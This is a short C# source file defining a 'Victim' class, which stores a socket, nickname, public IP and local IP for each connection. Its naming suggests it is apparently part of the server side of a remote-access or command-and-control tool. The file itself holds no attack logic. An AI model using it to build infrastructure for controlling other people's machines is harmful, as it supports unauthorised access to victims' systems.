using System;
using System.Collections.Generic;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace Wubalubadubdub_Server
{
    public class Victim
    {
        public Socket socket;
        public String nickName;
        public String IP;
        public String localIP;

        public Victim(Socket socket, string nickName, string ip, string localIp)
        {
            this.socket = socket;
            this.nickName = nickName;
            IP = ip;
            localIP = localIp;
        }

        public Victim(Socket socket, string nickName)
        {
            this.socket = socket;
            this.nickName = nickName;
        }

        public Victim(Socket socket)
        {
            this.socket = socket;
        }
    }
}